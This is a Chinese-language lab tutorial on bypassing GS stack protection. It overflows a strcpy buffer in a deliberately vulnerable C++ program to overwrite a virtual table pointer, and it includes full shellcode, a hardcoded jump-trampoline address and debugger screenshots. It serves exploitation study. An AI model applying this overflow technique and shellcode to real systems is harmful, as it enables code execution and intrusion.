### 觀察虛表位置與堆疊
```
//#include "stdafx.h"
#include "string.h"

class GSVirtual {
public :
	void gsv(char * src)
	{
		char buf[200];
		strcpy(buf, src);
		__asm int 3 //used to break the process
		bar(); // virtual function call
	}
	virtual void  bar()
	{
		__asm int 3 //used to break the process
	}
};
int main()
{

	GSVirtual test;

	__asm int 3 //used to break the process
	test.gsv(
		
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

/*
"AAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAA"
"AAAAAAAAAAAB"  
*/
		
		
		
		);
	return 0;
}
```

###   OD 會抓第一個斷點，按一下F9觀察第二個斷點，發現這幾行就是呼叫虛函數的一系列動作
![enter image description here](https://i.imgur.com/9zegJmK.png)


正常情況
![enter image description here](https://i.imgur.com/zwV8KHE.png)




### 把上面的shellcode 剩下字串開啟

```

"AAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAA"
"AAAAAAAAAAAB"  

```
### 這次很特別的是我們的shellcode 是字串最後面會幫我們補上\x00。(這個\x00剛好可以覆蓋虛表指針的第一個bytes)

###  使指針指向 00402100 也就是我們的.data 段 shellcode 地方

![enter image description here](https://i.imgur.com/ROsrqGA.png)







### 先觀察堆疊，可以發現 0012FE9C 是 buf的開頭，考慮到 call eax這行指令會push 下一行。 


![enter image description here](https://i.imgur.com/VeSbCP0.png)


###  所以在shellcode 最開始的地方替換成一個跳板地址，這個地址上的指令 是 pop # pop # retn ，就可以跳到buf 上面執行。



###   但是我找不到有 pop # pop # retn 的地址，所以改走其他路線

![enter image description here](https://i.imgur.com/7XPx2Li.png)


### 更改shellcode

```
//#include "stdafx.h"
#include "string.h"

class GSVirtual {
public :
	void gsv(char * src)
	{
		char buf[200];
		strcpy(buf, src);
		__asm int 3 //used to break the process
		bar(); // virtual function call
	}
	virtual void  bar()
	{
		__asm int 3 //used to break the process
	}
};
int main()
{

	GSVirtual test;

	__asm int 3 //used to break the process
	test.gsv(
		
		"\x63\xf9\xb2\x78" // 78b2f963  #jmp ebp

		"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
		"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
		"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
		"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
		"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
		"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
		"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
		"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
		"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
		"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
		"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"

		"AAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAA"
		"AAAAAAAAAAA"  
		//padding
		
		"\xe9\x28\xff\xff\xff" //jmp -216

		
		
		);
	return 0;
}
```

![enter image description here](https://i.imgur.com/eIQVsxV.png)

![enter image description here](https://i.imgur.com/7WOETo7.png)


###   注意:如果在這步調整jmp 距離錯誤時可以直接在OD上調整他會幫你計算出相應OPCODE
![enter image description here](https://i.imgur.com/WvgQ3qG.png)



### 跳到shellcode
![enter image description here](https://i.imgur.com/enn2MCh.png)

###  成功

![enter image description here](https://i.imgur.com/9w5zPLn.png)
